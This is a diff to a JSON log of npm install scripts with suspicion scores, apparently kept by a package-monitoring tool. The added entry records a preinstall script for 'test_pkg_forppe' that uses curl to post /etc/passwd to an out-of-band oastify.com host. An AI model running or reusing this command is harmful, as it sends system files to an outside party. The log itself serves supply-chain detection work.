@@ -1,5 +1,15 @@
 [
   {
+    "packageName": "test_pkg_forppe",
+    "version": "1.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "/usr/bin/curl --data '@/etc/passwd' http://$(hostname).2mpcyfqj3ad6v8e78fm8g8p0ur0io9cy.oastify.com",
+    "previousVersion": null,
+    "timestamp": "2026-03-14T08:46:21.325Z",
+    "issuesend": false,
+    "suspicionScore": 20
+  },
+  {
     "packageName": "skillsgate",
     "version": "0.2.0",
     "scriptType": "postinstall",
